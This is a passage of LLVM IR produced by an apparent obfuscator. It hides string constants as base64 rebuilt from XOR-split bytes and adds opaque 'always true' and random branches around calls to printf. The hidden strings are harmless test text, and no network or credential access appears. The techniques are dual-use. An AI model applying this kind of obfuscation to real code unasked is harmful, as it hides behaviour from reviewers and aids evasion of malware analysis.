  store [9 x i8] %spi58, [9 x i8]* %cipher.ptr.46
;-------------------------------
  %cipher.46 = getelementptr inbounds [9 x i8], [9 x i8]* %cipher.ptr.46, i32 0, i32 0
  %plain.ptr.46 = tail call i8* @base64_decode(i8* %cipher.46)
  %spi46 = ptrtoint i8* %plain.ptr.46 to i32
  store i32 %spi46, i32* %29, align 4
;-------------------------------
  %tmp2_v1.i4.i.i = add i32 %tmp0_v.i17.i, -56
  %30 = inttoptr i32 %tmp2_v1.i4.i.i to i32*
;-------------------------------
; Replace: store i32 134520840, i32* %30, align 8
  %cipher.ptr.47 = alloca [21 x i8]
;-------------------------------
; Replace: store [21 x i8] c"\53\53\42\68\62\53\42\6c\64\6d\6c\73\49\53\45\68\43\67\41\3d\00", [21 x i8]* %cipher.ptr.47
  %sp59 = alloca [21 x i8]

  
  %sp0.59 = bitcast [21 x i8]* %sp59 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\53\53", [2 x i8]* %sp0.59
  %sp0.133 = alloca [2 x i8]
  store [2 x i8] c"\19\65", [2 x i8]* %sp0.133
  %sp0.1.133 = bitcast [2 x i8]* %sp0.133 to i16*
  %i0.133 = load i16, i16* %sp0.1.133

  %sp1.133 = alloca [2 x i8]
  store [2 x i8] c"\4a\36", [2 x i8]* %sp1.133
  %sp1.1.133 = bitcast [2 x i8]* %sp1.133 to i16*
  %i1.133 = load i16, i16* %sp1.1.133

  %xp133 = xor i16 %i0.133, %i1.133

  %fi.133 = alloca i16
  store i16 %xp133, i16* %fi.133

  %final.ptr.133 = bitcast i16* %fi.133 to [2 x i8]*
  %spi133 = load [2 x i8], [2 x i8]* %final.ptr.133
  store [2 x i8] %spi133, [2 x i8]* %sp0.59
;-------------------------------
  %next0.59 = getelementptr [21 x i8], [21 x i8]* %sp59, i32 0, i32 2
  
  %sp1.59 = bitcast i8* %next0.59 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\42\68", [2 x i8]* %sp1.59
  %sp0.134 = alloca [2 x i8]
  store [2 x i8] c"\2A\0C", [2 x i8]* %sp0.134
  %sp0.1.134 = bitcast [2 x i8]* %sp0.134 to i16*
  %i0.134 = load i16, i16* %sp0.1.134

  %sp1.134 = alloca [2 x i8]
  store [2 x i8] c"\68\64", [2 x i8]* %sp1.134
  %sp1.1.134 = bitcast [2 x i8]* %sp1.134 to i16*
  %i1.134 = load i16, i16* %sp1.1.134

  %xp134 = xor i16 %i0.134, %i1.134

  %fi.134 = alloca i16
  store i16 %xp134, i16* %fi.134

  %final.ptr.134 = bitcast i16* %fi.134 to [2 x i8]*
  %spi134 = load [2 x i8], [2 x i8]* %final.ptr.134
  store [2 x i8] %spi134, [2 x i8]* %sp1.59
;-------------------------------
  %next1.59 = getelementptr [21 x i8], [21 x i8]* %sp59, i32 0, i32 4
  
  %sp2.59 = bitcast i8* %next1.59 to [3 x i8]*
;-------------------------------
; Replace: store [3 x i8] c"\62\53\42", [3 x i8]* %sp2.59
  %sp0.135 = alloca [3 x i8]
  store [3 x i8] c"\10\6A\7B", [3 x i8]* %sp0.135
  %sp0.1.135 = bitcast [3 x i8]* %sp0.135 to i24*
  %i0.135 = load i24, i24* %sp0.1.135

  %sp1.135 = alloca [3 x i8]
  store [3 x i8] c"\72\39\39", [3 x i8]* %sp1.135
  %sp1.1.135 = bitcast [3 x i8]* %sp1.135 to i24*
  %i1.135 = load i24, i24* %sp1.1.135

  %xp135 = xor i24 %i0.135, %i1.135

  %fi.135 = alloca i24
  store i24 %xp135, i24* %fi.135

  %final.ptr.135 = bitcast i24* %fi.135 to [3 x i8]*
  %spi135 = load [3 x i8], [3 x i8]* %final.ptr.135
  store [3 x i8] %spi135, [3 x i8]* %sp2.59
;-------------------------------
  %next2.59 = getelementptr [21 x i8], [21 x i8]* %sp59, i32 0, i32 7
  
  %sp3.59 = bitcast i8* %next2.59 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\6c\64", [2 x i8]* %sp3.59
  %sp0.136 = alloca [2 x i8]
  store [2 x i8] c"\1D\17", [2 x i8]* %sp0.136
  %sp0.1.136 = bitcast [2 x i8]* %sp0.136 to i16*
  %i0.136 = load i16, i16* %sp0.1.136

  %sp1.136 = alloca [2 x i8]
  store [2 x i8] c"\71\73", [2 x i8]* %sp1.136
  %sp1.1.136 = bitcast [2 x i8]* %sp1.136 to i16*
  %i1.136 = load i16, i16* %sp1.1.136

  %xp136 = xor i16 %i0.136, %i1.136

  %fi.136 = alloca i16
  store i16 %xp136, i16* %fi.136

  %final.ptr.136 = bitcast i16* %fi.136 to [2 x i8]*
  %spi136 = load [2 x i8], [2 x i8]* %final.ptr.136
  store [2 x i8] %spi136, [2 x i8]* %sp3.59
;-------------------------------
  %next3.59 = getelementptr [21 x i8], [21 x i8]* %sp59, i32 0, i32 9
  
  %sp4.59 = bitcast i8* %next3.59 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\6d\6c", [2 x i8]* %sp4.59
  %sp0.137 = alloca [2 x i8]
  store [2 x i8] c"\5E\2E", [2 x i8]* %sp0.137
  %sp0.1.137 = bitcast [2 x i8]* %sp0.137 to i16*
  %i0.137 = load i16, i16* %sp0.1.137

  %sp1.137 = alloca [2 x i8]
  store [2 x i8] c"\33\42", [2 x i8]* %sp1.137
  %sp1.1.137 = bitcast [2 x i8]* %sp1.137 to i16*
  %i1.137 = load i16, i16* %sp1.1.137

  %xp137 = xor i16 %i0.137, %i1.137

  %fi.137 = alloca i16
  store i16 %xp137, i16* %fi.137

  %final.ptr.137 = bitcast i16* %fi.137 to [2 x i8]*
  %spi137 = load [2 x i8], [2 x i8]* %final.ptr.137
  store [2 x i8] %spi137, [2 x i8]* %sp4.59
;-------------------------------
  %next4.59 = getelementptr [21 x i8], [21 x i8]* %sp59, i32 0, i32 11
  
  %sp5.59 = bitcast i8* %next4.59 to [3 x i8]*
;-------------------------------
; Replace: store [3 x i8] c"\73\49\53", [3 x i8]* %sp5.59
  %sp0.138 = alloca [3 x i8]
  store [3 x i8] c"\47\2F\39", [3 x i8]* %sp0.138
  %sp0.1.138 = bitcast [3 x i8]* %sp0.138 to i24*
  %i0.138 = load i24, i24* %sp0.1.138

  %sp1.138 = alloca [3 x i8]
  store [3 x i8] c"\34\66\6a", [3 x i8]* %sp1.138
  %sp1.1.138 = bitcast [3 x i8]* %sp1.138 to i24*
  %i1.138 = load i24, i24* %sp1.1.138

  %xp138 = xor i24 %i0.138, %i1.138

  %fi.138 = alloca i24
  store i24 %xp138, i24* %fi.138

  %final.ptr.138 = bitcast i24* %fi.138 to [3 x i8]*
  %spi138 = load [3 x i8], [3 x i8]* %final.ptr.138
  store [3 x i8] %spi138, [3 x i8]* %sp5.59
;-------------------------------
  %next5.59 = getelementptr [21 x i8], [21 x i8]* %sp59, i32 0, i32 14
  
  %sp6.59 = bitcast i8* %next5.59 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\45\68", [2 x i8]* %sp6.59
  %sp0.139 = alloca [2 x i8]
  store [2 x i8] c"\13\1B", [2 x i8]* %sp0.139
  %sp0.1.139 = bitcast [2 x i8]* %sp0.139 to i16*
  %i0.139 = load i16, i16* %sp0.1.139

  %sp1.139 = alloca [2 x i8]
  store [2 x i8] c"\56\73", [2 x i8]* %sp1.139
  %sp1.1.139 = bitcast [2 x i8]* %sp1.139 to i16*
  %i1.139 = load i16, i16* %sp1.1.139

  %xp139 = xor i16 %i0.139, %i1.139

  %fi.139 = alloca i16
  store i16 %xp139, i16* %fi.139

  %final.ptr.139 = bitcast i16* %fi.139 to [2 x i8]*
  %spi139 = load [2 x i8], [2 x i8]* %final.ptr.139
  store [2 x i8] %spi139, [2 x i8]* %sp6.59
;-------------------------------
  %next6.59 = getelementptr [21 x i8], [21 x i8]* %sp59, i32 0, i32 16
  
  %sp7.59 = bitcast i8* %next6.59 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\43\67", [2 x i8]* %sp7.59
  %sp0.140 = alloca [2 x i8]
  store [2 x i8] c"\2D\0C", [2 x i8]* %sp0.140
  %sp0.1.140 = bitcast [2 x i8]* %sp0.140 to i16*
  %i0.140 = load i16, i16* %sp0.1.140

  %sp1.140 = alloca [2 x i8]
  store [2 x i8] c"\6e\6b", [2 x i8]* %sp1.140
  %sp1.1.140 = bitcast [2 x i8]* %sp1.140 to i16*
  %i1.140 = load i16, i16* %sp1.1.140

  %xp140 = xor i16 %i0.140, %i1.140

  %fi.140 = alloca i16
  store i16 %xp140, i16* %fi.140

  %final.ptr.140 = bitcast i16* %fi.140 to [2 x i8]*
  %spi140 = load [2 x i8], [2 x i8]* %final.ptr.140
  store [2 x i8] %spi140, [2 x i8]* %sp7.59
;-------------------------------
  %next7.59 = getelementptr [21 x i8], [21 x i8]* %sp59, i32 0, i32 18
  
  %sp8.59 = bitcast i8* %next7.59 to [3 x i8]*
;-------------------------------
; Replace: store [3 x i8] c"\41\3d\00", [3 x i8]* %sp8.59
  %sp0.141 = alloca [3 x i8]
  store [3 x i8] c"\0E\6B\58", [3 x i8]* %sp0.141
  %sp0.1.141 = bitcast [3 x i8]* %sp0.141 to i24*
  %i0.141 = load i24, i24* %sp0.1.141

  %sp1.141 = alloca [3 x i8]
  store [3 x i8] c"\4f\56\58", [3 x i8]* %sp1.141
  %sp1.1.141 = bitcast [3 x i8]* %sp1.141 to i24*
  %i1.141 = load i24, i24* %sp1.1.141

  %xp141 = xor i24 %i0.141, %i1.141

  %fi.141 = alloca i24
  store i24 %xp141, i24* %fi.141

  %final.ptr.141 = bitcast i24* %fi.141 to [3 x i8]*
  %spi141 = load [3 x i8], [3 x i8]* %final.ptr.141
  store [3 x i8] %spi141, [3 x i8]* %sp8.59
;-------------------------------

  %spi59 = load [21 x i8], [21 x i8]* %sp59
  store [21 x i8] %spi59, [21 x i8]* %cipher.ptr.47
;-------------------------------
  %cipher.47 = getelementptr inbounds [21 x i8], [21 x i8]* %cipher.ptr.47, i32 0, i32 0
  %plain.ptr.47 = tail call i8* @base64_decode(i8* %cipher.47)
  %spi47 = ptrtoint i8* %plain.ptr.47 to i32
  store i32 %spi47, i32* %30, align 8
;-------------------------------
;-------------------------------
;--------Basic Condition--------
  %.not12.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not12.i.i, label %BB_12, label %next12
next12:
;-------------------------------
;-------------------------------
; Replace: store i32 134520854, i32* %14, align 4
  %cipher.ptr.48 = alloca [13 x i8]
;-------------------------------
; Replace: store [13 x i8] c"\51\6e\6c\6c\49\45\4a\35\5a\51\6f\41\00", [13 x i8]* %cipher.ptr.48
  %sp60 = alloca [13 x i8]

  
  %sp0.60 = bitcast [13 x i8]* %sp60 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\51", [1 x i8]* %sp0.60
  %sp0.142 = alloca [1 x i8]
  store [1 x i8] c"\3F", [1 x i8]* %sp0.142
  %sp0.1.142 = bitcast [1 x i8]* %sp0.142 to i8*
  %i0.142 = load i8, i8* %sp0.1.142

  %sp1.142 = alloca [1 x i8]
  store [1 x i8] c"\6e", [1 x i8]* %sp1.142
  %sp1.1.142 = bitcast [1 x i8]* %sp1.142 to i8*
  %i1.142 = load i8, i8* %sp1.1.142

  %xp142 = xor i8 %i0.142, %i1.142

  %fi.142 = alloca i8
  store i8 %xp142, i8* %fi.142

  %final.ptr.142 = bitcast i8* %fi.142 to [1 x i8]*
  %spi142 = load [1 x i8], [1 x i8]* %final.ptr.142
  store [1 x i8] %spi142, [1 x i8]* %sp0.60
;-------------------------------
  %next0.60 = getelementptr [13 x i8], [13 x i8]* %sp60, i32 0, i32 1
  
  %sp1.60 = bitcast i8* %next0.60 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\6e", [1 x i8]* %sp1.60
  %sp0.143 = alloca [1 x i8]
  store [1 x i8] c"\0A", [1 x i8]* %sp0.143
  %sp0.1.143 = bitcast [1 x i8]* %sp0.143 to i8*
  %i0.143 = load i8, i8* %sp0.1.143

  %sp1.143 = alloca [1 x i8]
  store [1 x i8] c"\64", [1 x i8]* %sp1.143
  %sp1.1.143 = bitcast [1 x i8]* %sp1.143 to i8*
  %i1.143 = load i8, i8* %sp1.1.143

  %xp143 = xor i8 %i0.143, %i1.143

  %fi.143 = alloca i8
  store i8 %xp143, i8* %fi.143

  %final.ptr.143 = bitcast i8* %fi.143 to [1 x i8]*
  %spi143 = load [1 x i8], [1 x i8]* %final.ptr.143
  store [1 x i8] %spi143, [1 x i8]* %sp1.60
;-------------------------------
  %next1.60 = getelementptr [13 x i8], [13 x i8]* %sp60, i32 0, i32 2
  
  %sp2.60 = bitcast i8* %next1.60 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\6c\6c", [2 x i8]* %sp2.60
  %sp0.144 = alloca [2 x i8]
  store [2 x i8] c"\01\1C", [2 x i8]* %sp0.144
  %sp0.1.144 = bitcast [2 x i8]* %sp0.144 to i16*
  %i0.144 = load i16, i16* %sp0.1.144

  %sp1.144 = alloca [2 x i8]
  store [2 x i8] c"\6d\70", [2 x i8]* %sp1.144
  %sp1.1.144 = bitcast [2 x i8]* %sp1.144 to i16*
  %i1.144 = load i16, i16* %sp1.1.144

  %xp144 = xor i16 %i0.144, %i1.144

  %fi.144 = alloca i16
  store i16 %xp144, i16* %fi.144

  %final.ptr.144 = bitcast i16* %fi.144 to [2 x i8]*
  %spi144 = load [2 x i8], [2 x i8]* %final.ptr.144
  store [2 x i8] %spi144, [2 x i8]* %sp2.60
;-------------------------------
  %next2.60 = getelementptr [13 x i8], [13 x i8]* %sp60, i32 0, i32 4
  
  %sp3.60 = bitcast i8* %next2.60 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\49", [1 x i8]* %sp3.60
  %sp0.145 = alloca [1 x i8]
  store [1 x i8] c"\3B", [1 x i8]* %sp0.145
  %sp0.1.145 = bitcast [1 x i8]* %sp0.145 to i8*
  %i0.145 = load i8, i8* %sp0.1.145

  %sp1.145 = alloca [1 x i8]
  store [1 x i8] c"\72", [1 x i8]* %sp1.145
  %sp1.1.145 = bitcast [1 x i8]* %sp1.145 to i8*
  %i1.145 = load i8, i8* %sp1.1.145

  %xp145 = xor i8 %i0.145, %i1.145

  %fi.145 = alloca i8
  store i8 %xp145, i8* %fi.145

  %final.ptr.145 = bitcast i8* %fi.145 to [1 x i8]*
  %spi145 = load [1 x i8], [1 x i8]* %final.ptr.145
  store [1 x i8] %spi145, [1 x i8]* %sp3.60
;-------------------------------
  %next3.60 = getelementptr [13 x i8], [13 x i8]* %sp60, i32 0, i32 5
  
  %sp4.60 = bitcast i8* %next3.60 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\45\4a", [2 x i8]* %sp4.60
  %sp0.146 = alloca [2 x i8]
  store [2 x i8] c"\2D\0F", [2 x i8]* %sp0.146
  %sp0.1.146 = bitcast [2 x i8]* %sp0.146 to i16*
  %i0.146 = load i16, i16* %sp0.1.146

  %sp1.146 = alloca [2 x i8]
  store [2 x i8] c"\68\45", [2 x i8]* %sp1.146
  %sp1.1.146 = bitcast [2 x i8]* %sp1.146 to i16*
  %i1.146 = load i16, i16* %sp1.1.146

  %xp146 = xor i16 %i0.146, %i1.146

  %fi.146 = alloca i16
  store i16 %xp146, i16* %fi.146

  %final.ptr.146 = bitcast i16* %fi.146 to [2 x i8]*
  %spi146 = load [2 x i8], [2 x i8]* %final.ptr.146
  store [2 x i8] %spi146, [2 x i8]* %sp4.60
;-------------------------------
  %next4.60 = getelementptr [13 x i8], [13 x i8]* %sp60, i32 0, i32 7
  
  %sp5.60 = bitcast i8* %next4.60 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\35", [1 x i8]* %sp5.60
  %sp0.147 = alloca [1 x i8]
  store [1 x i8] c"\7F", [1 x i8]* %sp0.147
  %sp0.1.147 = bitcast [1 x i8]* %sp0.147 to i8*
  %i0.147 = load i8, i8* %sp0.1.147

  %sp1.147 = alloca [1 x i8]
  store [1 x i8] c"\4a", [1 x i8]* %sp1.147
  %sp1.1.147 = bitcast [1 x i8]* %sp1.147 to i8*
  %i1.147 = load i8, i8* %sp1.1.147

  %xp147 = xor i8 %i0.147, %i1.147

  %fi.147 = alloca i8
  store i8 %xp147, i8* %fi.147

  %final.ptr.147 = bitcast i8* %fi.147 to [1 x i8]*
  %spi147 = load [1 x i8], [1 x i8]* %final.ptr.147
  store [1 x i8] %spi147, [1 x i8]* %sp5.60
;-------------------------------
  %next5.60 = getelementptr [13 x i8], [13 x i8]* %sp60, i32 0, i32 8
  
  %sp6.60 = bitcast i8* %next5.60 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\5a\51", [2 x i8]* %sp6.60
  %sp0.148 = alloca [2 x i8]
  store [2 x i8] c"\6A\1B", [2 x i8]* %sp0.148
  %sp0.1.148 = bitcast [2 x i8]* %sp0.148 to i16*
  %i0.148 = load i16, i16* %sp0.1.148

  %sp1.148 = alloca [2 x i8]
  store [2 x i8] c"\30\4a", [2 x i8]* %sp1.148
  %sp1.1.148 = bitcast [2 x i8]* %sp1.148 to i16*
  %i1.148 = load i16, i16* %sp1.1.148

  %xp148 = xor i16 %i0.148, %i1.148

  %fi.148 = alloca i16
  store i16 %xp148, i16* %fi.148

  %final.ptr.148 = bitcast i16* %fi.148 to [2 x i8]*
  %spi148 = load [2 x i8], [2 x i8]* %final.ptr.148
  store [2 x i8] %spi148, [2 x i8]* %sp6.60
;-------------------------------
  %next6.60 = getelementptr [13 x i8], [13 x i8]* %sp60, i32 0, i32 10
  
  %sp7.60 = bitcast i8* %next6.60 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\6f", [1 x i8]* %sp7.60
  %sp0.149 = alloca [1 x i8]
  store [1 x i8] c"\2D", [1 x i8]* %sp0.149
  %sp0.1.149 = bitcast [1 x i8]* %sp0.149 to i8*
  %i0.149 = load i8, i8* %sp0.1.149

  %sp1.149 = alloca [1 x i8]
  store [1 x i8] c"\42", [1 x i8]* %sp1.149
  %sp1.1.149 = bitcast [1 x i8]* %sp1.149 to i8*
  %i1.149 = load i8, i8* %sp1.1.149

  %xp149 = xor i8 %i0.149, %i1.149

  %fi.149 = alloca i8
  store i8 %xp149, i8* %fi.149

  %final.ptr.149 = bitcast i8* %fi.149 to [1 x i8]*
  %spi149 = load [1 x i8], [1 x i8]* %final.ptr.149
  store [1 x i8] %spi149, [1 x i8]* %sp7.60
;-------------------------------
  %next7.60 = getelementptr [13 x i8], [13 x i8]* %sp60, i32 0, i32 11
  
  %sp8.60 = bitcast i8* %next7.60 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\41\00", [2 x i8]* %sp8.60
  %sp0.150 = alloca [2 x i8]
  store [2 x i8] c"\76\43", [2 x i8]* %sp0.150
  %sp0.1.150 = bitcast [2 x i8]* %sp0.150 to i16*
  %i0.150 = load i16, i16* %sp0.1.150

  %sp1.150 = alloca [2 x i8]
  store [2 x i8] c"\37\43", [2 x i8]* %sp1.150
  %sp1.1.150 = bitcast [2 x i8]* %sp1.150 to i16*
  %i1.150 = load i16, i16* %sp1.1.150

  %xp150 = xor i16 %i0.150, %i1.150

  %fi.150 = alloca i16
  store i16 %xp150, i16* %fi.150

  %final.ptr.150 = bitcast i16* %fi.150 to [2 x i8]*
  %spi150 = load [2 x i8], [2 x i8]* %final.ptr.150
  store [2 x i8] %spi150, [2 x i8]* %sp8.60
;-------------------------------

  %spi60 = load [13 x i8], [13 x i8]* %sp60
  store [13 x i8] %spi60, [13 x i8]* %cipher.ptr.48
;-------------------------------
  %cipher.48 = getelementptr inbounds [13 x i8], [13 x i8]* %cipher.ptr.48, i32 0, i32 0
  %plain.ptr.48 = tail call i8* @base64_decode(i8* %cipher.48)
  %spi48 = ptrtoint i8* %plain.ptr.48 to i32
  store i32 %spi48, i32* %14, align 4
;-------------------------------
  %31 = load i32, i32* %30, align 8
  %tmp2_v7.i.i.i = add i32 %tmp0_v.i17.i, -76
  %32 = inttoptr i32 %tmp2_v7.i.i.i to i32*
  store i32 %31, i32* %32, align 4
  %tmp2_v9.i.i.i = add i32 %tmp0_v.i17.i, -80
  %33 = inttoptr i32 %tmp2_v9.i.i.i to i32*
;-------------------------------
; Replace: store i32 134520863, i32* %33, align 16
  %cipher.ptr.49 = alloca [5 x i8]
;-------------------------------
; Replace: store [5 x i8] c"\4a\58\4d\41\00", [5 x i8]* %cipher.ptr.49
  %sp61 = alloca [5 x i8]

  
  %sp0.61 = bitcast [5 x i8]* %sp61 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\4a", [1 x i8]* %sp0.61
  %sp0.151 = alloca [1 x i8]
  store [1 x i8] c"\79", [1 x i8]* %sp0.151
  %sp0.1.151 = bitcast [1 x i8]* %sp0.151 to i8*
  %i0.151 = load i8, i8* %sp0.1.151

  %sp1.151 = alloca [1 x i8]
  store [1 x i8] c"\33", [1 x i8]* %sp1.151
  %sp1.1.151 = bitcast [1 x i8]* %sp1.151 to i8*
  %i1.151 = load i8, i8* %sp1.1.151

  %xp151 = xor i8 %i0.151, %i1.151

  %fi.151 = alloca i8
  store i8 %xp151, i8* %fi.151

  %final.ptr.151 = bitcast i8* %fi.151 to [1 x i8]*
  %spi151 = load [1 x i8], [1 x i8]* %final.ptr.151
  store [1 x i8] %spi151, [1 x i8]* %sp0.61
;-------------------------------
  %next0.61 = getelementptr [5 x i8], [5 x i8]* %sp61, i32 0, i32 1
  
  %sp1.61 = bitcast i8* %next0.61 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\58", [1 x i8]* %sp1.61
  %sp0.152 = alloca [1 x i8]
  store [1 x i8] c"\16", [1 x i8]* %sp0.152
  %sp0.1.152 = bitcast [1 x i8]* %sp0.152 to i8*
  %i0.152 = load i8, i8* %sp0.1.152

  %sp1.152 = alloca [1 x i8]
  store [1 x i8] c"\4e", [1 x i8]* %sp1.152
  %sp1.1.152 = bitcast [1 x i8]* %sp1.152 to i8*
  %i1.152 = load i8, i8* %sp1.1.152

  %xp152 = xor i8 %i0.152, %i1.152

  %fi.152 = alloca i8
  store i8 %xp152, i8* %fi.152

  %final.ptr.152 = bitcast i8* %fi.152 to [1 x i8]*
  %spi152 = load [1 x i8], [1 x i8]* %final.ptr.152
  store [1 x i8] %spi152, [1 x i8]* %sp1.61
;-------------------------------
  %next1.61 = getelementptr [5 x i8], [5 x i8]* %sp61, i32 0, i32 2
  
  %sp2.61 = bitcast i8* %next1.61 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\4d", [1 x i8]* %sp2.61
  %sp0.153 = alloca [1 x i8]
  store [1 x i8] c"\2F", [1 x i8]* %sp0.153
  %sp0.1.153 = bitcast [1 x i8]* %sp0.153 to i8*
  %i0.153 = load i8, i8* %sp0.1.153

  %sp1.153 = alloca [1 x i8]
  store [1 x i8] c"\62", [1 x i8]* %sp1.153
  %sp1.1.153 = bitcast [1 x i8]* %sp1.153 to i8*
  %i1.153 = load i8, i8* %sp1.1.153

  %xp153 = xor i8 %i0.153, %i1.153

  %fi.153 = alloca i8
  store i8 %xp153, i8* %fi.153

  %final.ptr.153 = bitcast i8* %fi.153 to [1 x i8]*
  %spi153 = load [1 x i8], [1 x i8]* %final.ptr.153
  store [1 x i8] %spi153, [1 x i8]* %sp2.61
;-------------------------------
  %next2.61 = getelementptr [5 x i8], [5 x i8]* %sp61, i32 0, i32 3
  
  %sp3.61 = bitcast i8* %next2.61 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\41", [1 x i8]* %sp3.61
  %sp0.154 = alloca [1 x i8]
  store [1 x i8] c"\0A", [1 x i8]* %sp0.154
  %sp0.1.154 = bitcast [1 x i8]* %sp0.154 to i8*
  %i0.154 = load i8, i8* %sp0.1.154

  %sp1.154 = alloca [1 x i8]
  store [1 x i8] c"\4b", [1 x i8]* %sp1.154
  %sp1.1.154 = bitcast [1 x i8]* %sp1.154 to i8*
  %i1.154 = load i8, i8* %sp1.1.154

  %xp154 = xor i8 %i0.154, %i1.154

  %fi.154 = alloca i8
  store i8 %xp154, i8* %fi.154

  %final.ptr.154 = bitcast i8* %fi.154 to [1 x i8]*
  %spi154 = load [1 x i8], [1 x i8]* %final.ptr.154
  store [1 x i8] %spi154, [1 x i8]* %sp3.61
;-------------------------------
  %next3.61 = getelementptr [5 x i8], [5 x i8]* %sp61, i32 0, i32 4
  
  %sp4.61 = bitcast i8* %next3.61 to [1 x i8]*
  store [1 x i8] c"\00", [1 x i8]* %sp4.61

  %spi61 = load [5 x i8], [5 x i8]* %sp61
  store [5 x i8] %spi61, [5 x i8]* %cipher.ptr.49
;-------------------------------
  %cipher.49 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.49, i32 0, i32 0
  %plain.ptr.49 = tail call i8* @base64_decode(i8* %cipher.49)
  %spi49 = ptrtoint i8* %plain.ptr.49 to i32
  store i32 %spi49, i32* %33, align 16
;-------------------------------
  %tmp2_v10.i.i.i = add i32 %tmp0_v.i17.i, -84
  %34 = inttoptr i32 %tmp2_v10.i.i.i to i32*
  store i32 134517457, i32* %34, align 4
  %35 = tail call x86_fastcallcc i64 @helper_stub_trampoline(i32 inreg noundef %tmp2_v.i16.i, i32 inreg noundef 134520863, i32 noundef %tmp2_v9.i.i.i, i32 noundef ptrtoint (i32 (i8*, ...)* @printf to i32)) #11, !funcname !13
  br label %.exit

BB_804942D.i:                                     ; preds = %Func_804941F.exit.i
  %36 = load i32, i32* %8, align 4
;-------------------------------
;----------Random Cond----------
  %.not82.i.i = icmp eq i32 4 , %rand_fin81 
  br i1 %.not82.i.i, label %next82, label %BB_82
next82:
;-------------------------------
  %tmp0_v1.i40.i = add i32 %36, 4
  %37 = inttoptr i32 %tmp0_v1.i40.i to i32*
  %38 = load i32, i32* %37, align 4
;-------------------------------
;--------Basic Condition--------
  %.not6.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not6.i.i, label %BB_6, label %next6
next6:
;-------------------------------
;-------------------------------
; Replace: store i32 134520902, i32* %12, align 4
  %cipher.ptr.50 = alloca [5 x i8]
;-------------------------------
; Replace: store [5 x i8] c"\4d\67\41\3d\00", [5 x i8]* %cipher.ptr.50
  %sp62 = alloca [5 x i8]

  
  %sp0.62 = bitcast [5 x i8]* %sp62 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\4d", [1 x i8]* %sp0.62
  %sp0.155 = alloca [1 x i8]
  store [1 x i8] c"\2C", [1 x i8]* %sp0.155
  %sp0.1.155 = bitcast [1 x i8]* %sp0.155 to i8*
  %i0.155 = load i8, i8* %sp0.1.155

  %sp1.155 = alloca [1 x i8]
  store [1 x i8] c"\61", [1 x i8]* %sp1.155
  %sp1.1.155 = bitcast [1 x i8]* %sp1.155 to i8*
  %i1.155 = load i8, i8* %sp1.1.155

  %xp155 = xor i8 %i0.155, %i1.155

  %fi.155 = alloca i8
  store i8 %xp155, i8* %fi.155

  %final.ptr.155 = bitcast i8* %fi.155 to [1 x i8]*
  %spi155 = load [1 x i8], [1 x i8]* %final.ptr.155
  store [1 x i8] %spi155, [1 x i8]* %sp0.62
;-------------------------------
  %next0.62 = getelementptr [5 x i8], [5 x i8]* %sp62, i32 0, i32 1
  
  %sp1.62 = bitcast i8* %next0.62 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\67", [1 x i8]* %sp1.62
  %sp0.156 = alloca [1 x i8]
  store [1 x i8] c"\57", [1 x i8]* %sp0.156
  %sp0.1.156 = bitcast [1 x i8]* %sp0.156 to i8*
  %i0.156 = load i8, i8* %sp0.1.156

  %sp1.156 = alloca [1 x i8]
  store [1 x i8] c"\30", [1 x i8]* %sp1.156
  %sp1.1.156 = bitcast [1 x i8]* %sp1.156 to i8*
  %i1.156 = load i8, i8* %sp1.1.156

  %xp156 = xor i8 %i0.156, %i1.156

  %fi.156 = alloca i8
  store i8 %xp156, i8* %fi.156

  %final.ptr.156 = bitcast i8* %fi.156 to [1 x i8]*
  %spi156 = load [1 x i8], [1 x i8]* %final.ptr.156
  store [1 x i8] %spi156, [1 x i8]* %sp1.62
;-------------------------------
  %next1.62 = getelementptr [5 x i8], [5 x i8]* %sp62, i32 0, i32 2
  
  %sp2.62 = bitcast i8* %next1.62 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\41", [1 x i8]* %sp2.62
  %sp0.157 = alloca [1 x i8]
  store [1 x i8] c"\12", [1 x i8]* %sp0.157
  %sp0.1.157 = bitcast [1 x i8]* %sp0.157 to i8*
  %i0.157 = load i8, i8* %sp0.1.157

  %sp1.157 = alloca [1 x i8]
  store [1 x i8] c"\53", [1 x i8]* %sp1.157
  %sp1.1.157 = bitcast [1 x i8]* %sp1.157 to i8*
  %i1.157 = load i8, i8* %sp1.1.157

  %xp157 = xor i8 %i0.157, %i1.157

  %fi.157 = alloca i8
  store i8 %xp157, i8* %fi.157

  %final.ptr.157 = bitcast i8* %fi.157 to [1 x i8]*
  %spi157 = load [1 x i8], [1 x i8]* %final.ptr.157
  store [1 x i8] %spi157, [1 x i8]* %sp2.62
;-------------------------------
  %next2.62 = getelementptr [5 x i8], [5 x i8]* %sp62, i32 0, i32 3
  
  %sp3.62 = bitcast i8* %next2.62 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\3d", [1 x i8]* %sp3.62
  %sp0.158 = alloca [1 x i8]
  store [1 x i8] c"\6D", [1 x i8]* %sp0.158
  %sp0.1.158 = bitcast [1 x i8]* %sp0.158 to i8*
  %i0.158 = load i8, i8* %sp0.1.158

  %sp1.158 = alloca [1 x i8]
  store [1 x i8] c"\50", [1 x i8]* %sp1.158
